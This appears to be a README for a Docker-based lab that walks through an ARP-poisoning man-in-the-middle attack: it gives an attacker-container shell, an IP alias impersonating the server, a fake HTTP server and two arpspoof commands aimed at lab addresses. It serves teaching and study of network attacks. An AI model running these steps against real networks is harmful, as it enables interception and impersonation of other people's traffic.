# ARP Poisoning MITM using Docker containers 

## 1. Start the Containers

```bash
(sudo) docker compose up
```

---

## 2. Enter as the attacker (you will need multiple sessions)

```bash
sudo docker exec -it attacker bash
```

---

## 3. Add Server IP Alias

```bash
ip addr add 192.168.90.100/32 dev eth0
```

---

## 4. Launch the Fake HTTP Server

```bash
python3 fakeserver.py
```

---

## 5. Start ARP Poisoning

Run two `arpspoof` processes:

```bash
arpspoof -i eth0 -t 192.168.90.101 192.168.90.100 
arpspoof -i eth0 -t 192.168.90.100 192.168.90.101 
```